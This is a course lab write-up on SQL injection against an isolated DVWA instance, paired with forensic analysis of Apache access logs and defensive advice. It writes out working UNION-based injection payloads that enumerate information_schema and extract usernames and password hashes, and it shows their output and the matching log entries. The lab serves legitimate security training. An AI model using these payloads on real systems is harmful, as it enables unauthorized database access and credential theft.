# Activity 15.1 — Investigating SQL Injection Attacks

> **Program:** Hackers do Bem  
> **Stage:** Specialization — Incident Response and Digital Forensics  
> **Module:** 03  
> **Class:** 03  
> **Course Lesson:** 15  
> **Environment:** DVWA — forenseLinux and forenseWin VMs  
> **Status:** Completed

## 1. Objective

Investigate a SQL Injection vulnerability in the Damn Vulnerable Web Application (DVWA) and examine the server-side evidence generated during the attack.

The practical exercise uses DVWA with its security level configured to **Low**.

The attacker workstation submits SQL expressions through the application's input field. The vulnerable application processes the supplied input as part of a database query, allowing the retrieval of information beyond the intended user lookup.

The investigation then examines the Apache access log to identify the HTTP requests associated with the attack.

The main objectives are:

- Identify a SQL Injection vulnerability.
- Determine the number of columns used by the query.
- Identify the database management system and version.
- Enumerate database schemas, tables, and columns.
- Retrieve user records and password hashes.
- Correlate the attack with HTTP requests recorded by Apache.

## 2. Environment

| Item | Details |
|---|---|
| Application | Damn Vulnerable Web Application (DVWA) |
| Web Server / Database Host | `forenseLinux` |
| Server IP | `192.168.98.10` |
| Attacker Workstation | `forenseWin` |
| Attacker IP | `192.168.98.30` |
| Application URL | `http://192.168.98.10/dvwa` |
| Application Module | SQL Injection |
| DVWA Security Level | Low |
| Database | MariaDB |
| Database Version | `10.5.19-MariaDB-0+deb11u2` |
| Database Name | `dvwa` |
| Web Server | Apache HTTP Server |
| Main Evidence Log | `/var/log/apache2/access.log` |
| Browser | Firefox 114.0 |
| Client Operating System | Windows 10 |

The course environment uses the following initial DVWA login:

| Field | Value |
|---|---|
| Username | `admin` |
| Password | `password` |

The application security level was changed from **Impossible** to **Low** through the DVWA Security page.

This is an intentionally vulnerable training environment and must remain isolated from production systems and public networks.

## 3. Technical Concepts

### SQL Injection

SQL Injection occurs when application input is incorporated into a database query without being safely separated from the SQL statement structure.

An attacker may manipulate the query logic through specially crafted input.

Depending on the application's database permissions and query structure, successful injection can expose:

- Database names.
- Database versions.
- Schema information.
- Table names.
- Column names.
- User records.
- Password hashes.
- Other information accessible to the application database account.

### UNION-Based SQL Injection

The SQL `UNION` operator combines results from multiple `SELECT` statements.

In a vulnerable application, an attacker may attempt to append a second query to the original one.

For a UNION-based injection to work, the selected queries must have compatible result structures, including the same number of columns and compatible data types.

The laboratory uses this behavior to determine the number of columns and enumerate database metadata.

### information_schema

MariaDB and MySQL provide the `information_schema` database with metadata describing database objects.

Relevant tables include:

| Table | Purpose |
|---|---|
| `schemata` | Lists database schemas |
| `tables` | Lists tables and their schemas |
| `columns` | Lists columns and their associated tables |

The activity uses these metadata tables to identify the structure of the `dvwa` database.

### Apache Access Logs

Apache's access log records HTTP requests received by the web server.

Depending on the configured log format, entries can include:

- Remote client IP address.
- Request timestamp.
- HTTP method.
- Requested URI.
- HTTP protocol version.
- Response status.
- Response size.
- Referrer.
- User-Agent string.

The access log is useful for reconstructing the sequence of requests associated with a web attack.

## 4. Procedure

### Step 1 — Prepare DVWA

The application was accessed from the browser on `forenseWin`:

```text
http://192.168.98.10/dvwa
```

The initial credentials supplied by the course were:

```text
Username: admin
Password: password
```

The DVWA Security section was opened.

The security level was changed from:

```text
Impossible
```

to:

```text
Low
```

The configuration was submitted.

The activity also used Cookie-Editor to delete the `PHPSESSID` cookie and then authenticate again, establishing a fresh application session.

### Step 2 — Identify the SQL Injection Vulnerability

The SQL Injection module was opened.

The application presented an input field used to search for user information.

The first test used the following input:

```sql
' or '1; -- "
```

The application returned multiple user records instead of restricting the result to the intended user.

The recorded output included:

| First Name | Surname |
|---|---|
| admin | admin |
| Gordon | Brown |
| Hack | Me |
| Pablo | Picasso |
| Bob | Smith |

The output demonstrated that the supplied input altered the original database query.

### Step 3 — Determine the Number of Query Columns

The next test used:

```sql
' union all select 1,2; -- "
```

The application returned:

```text
ID: ' union all select 1,2; -- "
First name: 1
Surname: 2
```

This demonstrated that the vulnerable query returned two columns.

The result was useful for constructing subsequent UNION-based tests with a compatible number of columns.

### Step 4 — Identify the Database and Version

The following input was used:

```sql
' union all select database(),version(); -- "
```

The application returned:

```text
ID: ' union all select database(),version(); -- "
First name: dvwa
Surname: 10.5.19-MariaDB-0+deb11u2
```

The result identified:

| Field | Value |
|---|---|
| Database | `dvwa` |
| DBMS | MariaDB |
| Version | `10.5.19-MariaDB-0+deb11u2` |

### Step 5 — Identify the Database Schemas

The next query examined schema metadata:

```sql
' union all select 1, schema_name from information_schema.schemata; -- "
```

The recorded results included:

```text
First name: 1
Surname: information_schema

First name: 1
Surname: dvwa
```

The results identified the schemas relevant to the exercise.

### Step 6 — Enumerate Tables in the dvwa Database

The next input was:

```sql
' union all select 1, table_name from information_schema.tables where table_schema = 'dvwa'; -- "
```

The recorded output identified:

```text
First name: 1
Surname: users

First name: 1
Surname: guestbook
```

The two tables identified were:

| Table | Purpose |
|---|---|
| `users` | Contains application user records |
| `guestbook` | Stores guestbook entries |

### Step 7 — Enumerate Columns in the users Table

The following input was used:

```sql
' union all select 1, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'; -- "
```

The application returned these column names:

```text
user_id
first_name
last_name
user
password
avatar
last_login
failed_login
```

The table structure identified the fields containing the application usernames and password hashes.

### Step 8 — Retrieve Usernames and Password Hashes

The final extraction query was:

```sql
' union all select user, password from dvwa.users; -- "
```

The application returned the following records:

| Username | Password Hash |
|---|---|
| `admin` | `5f4dcc3b5aa765d61d8327deb882cf99` |
| `gordonb` | `e99a18c428cb38d5f260853678922e03` |
| `1337` | `8d3533d75ae2c3966d7e0d4fcc69216b` |
| `pablo` | `0d107d09f5bbe40cade3de5c71e9e9b7` |
| `smithy` | `5f4dcc3b5aa765d61d8327deb882cf99` |

The results demonstrate that the vulnerable application exposed the usernames and password hashes stored in its user table.

The hash values are preserved as evidence from the supplied course material. They should not be confused with plaintext passwords.

### Step 9 — Investigate the Apache Access Log

The investigation moved to the Linux server hosting DVWA.

A root shell was opened:

```bash
sudo su
```

The Apache access log was examined:

```bash
cat /var/log/apache2/access.log | more
```

The course material provides several entries associated with the SQL Injection tests.

A representative record is:

```text
192.168.98.30 - - [09/Jul/2023:19:00:54 +0000] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C2%3B+--+&Submit=Submit HTTP/1.1" 200 1718 "http://192.168.98.10/dvwa/vulnerabilities/sqli/?id=%27+or+%271%3B+--&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
```

Another representative record shows the database identification request:

```text
192.168.98.30 - - [09/Jul/2023:19:01:55 +0000] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+database%28%29%2Cversion%28%29%3B+--+&Submit=Submit HTTP/1.1" 200 1753
```

The log also records requests containing encoded references to:

```text
information_schema.schemata
information_schema.tables
information_schema.columns
dvwa.users
```

The recorded requests originated from:

```text
192.168.98.30
```

The User-Agent identifies:

```text
Windows NT 10.0
Firefox/114.0
```

The complete log is longer than the excerpts shown in the course material.

## 5. Expected Results

The activity demonstrates both the exploitation and forensic investigation of a SQL Injection vulnerability.

| Investigation Stage | Result |
|---|---|
| Initial SQL Injection test | Multiple user records returned |
| Column enumeration | 2 columns |
| Database identification | `dvwa` |
| DBMS | MariaDB |
| Database version | `10.5.19-MariaDB-0+deb11u2` |
| Schema enumeration | `information_schema`, `dvwa` |
| Table enumeration | `users`, `guestbook` |
| Column enumeration | 8 columns |
| User data extraction | 5 accounts and corresponding hashes |
| Server-side investigation | Apache `access.log` records the requests |
| Identified source IP | `192.168.98.30` |

## 6. Technical Analysis

### Evidence of SQL Injection

The initial response returned multiple records from the users table, indicating that the input changed the intended query behavior.

The UNION tests then demonstrated that the application exposed database information through the same input field.

The sequence of results shows how the attacker moved from vulnerability identification to database enumeration and data extraction.

### Database Enumeration

The investigation identified:

```text
Database: dvwa
DBMS: MariaDB
Version: 10.5.19-MariaDB-0+deb11u2
```

The `information_schema` metadata allowed the attacker to identify the tables and columns available in the database.

The `users` table contained the application account information targeted by the exercise.

### Password Hash Exposure

The extraction returned five usernames and corresponding hash strings.

Exposing password hashes is still a serious security incident because hashes may be targeted by offline password-cracking techniques.

Applications should avoid exposing database structures and should use modern password hashing algorithms with appropriate salts and work factors.

### Apache Log Analysis

The Apache access log provides the server-side evidence needed to reconstruct the request sequence.

Relevant indicators include:

- Source address `192.168.98.30`.
- Requests to `/dvwa/vulnerabilities/sqli/`.
- Repeated GET requests.
- URL-encoded SQL expressions.
- References to database metadata.
- Requests targeting the `dvwa.users` table.
- Browser identification through the User-Agent field.

The `200` HTTP status indicates that the server returned a successful HTTP response. It does not, by itself, prove that every database operation was successful.

The log content should be correlated with the application output and database results.

### Incident Timeline

The supplied log excerpt shows a sequence of requests on July 9, 2023.

Representative timestamps include:

| Timestamp (UTC) | Activity |
|---|---|
| 19:00:54 | UNION test for query columns |
| 19:01:55 | Database and version discovery |
| 19:18:57 | Schema enumeration |
| 19:50:07 | Table enumeration |
| 19:53:54 | Column enumeration |
| 19:57:43 | User and password hash extraction |

These records help reconstruct the progression of the attack.

### Defensive Recommendations

The primary defense against SQL Injection is to use parameterized queries.

Other controls include:

- Avoid concatenating untrusted input into SQL statements.
- Apply strict validation to inputs.
- Use database accounts with the minimum required privileges.
- Prevent application users from querying unnecessary metadata.
- Monitor repeated anomalous requests.
- Protect password hashes and sensitive database records.
- Use secure error handling that does not disclose internal database details.

## 7. Results and Interpretation

The activity demonstrated a successful SQL Injection against the DVWA application configured at Low security.

The attacker was able to retrieve database information, identify tables and columns, and extract five user records with their associated password hashes.

The Apache access log preserved the HTTP requests used during the tests.

By correlating the application responses with the server logs, the investigation established the source IP, timestamps, requested paths, SQL-related parameters, and browser information.

This demonstrates how exploitation evidence can be reconstructed from web server logs.

## 8. Concepts Practiced

- Web application security
- DVWA
- SQL Injection
- UNION-based SQL Injection
- MariaDB
- Database enumeration
- `information_schema`
- Schema enumeration
- Table enumeration
- Column enumeration
- Password hash exposure
- HTTP GET requests
- URL encoding
- Apache HTTP Server
- Access log analysis
- Incident timeline reconstruction
- Source IP identification
- User-Agent analysis
- Parameterized queries

## 9. Evidence

**Required screenshot according to the practical instructions: Activity 15.1 — Step 9 — PDF page 1.**

The course instructions identify the Apache access log investigation as the required screenshot for this activity.

The screenshot should show:

```bash
cat /var/log/apache2/access.log | more
```

The relevant request records should be visible, including the source IP and SQL-related request parameters.

**Evidence description supplied separately:** the provided screenshot summary describes the DVWA SQL Injection page with the successful data extraction. This corresponds to the exploitation portion of the activity rather than the Step 9 server-log investigation.

Verify that the final evidence PDF contains the screenshot required by the course instructions.

[View Class Evidence PDF](../evidences.pdf)

## References

- [Damn Vulnerable Web Application — Official Repository](https://github.com/digininja/DVWA)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP — SQL Injection Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Apache HTTP Server — Log Files](https://httpd.apache.org/docs/current/logs.html)
- [MariaDB — Information Schema](https://mariadb.com/kb/en/information-schema/)

---

[Back to Module 03](../../README.md) · [Back to Specialization](../../../README.md) · [Next Activity — 15.2](../atividade-15.2-xss-refletido/README.md)
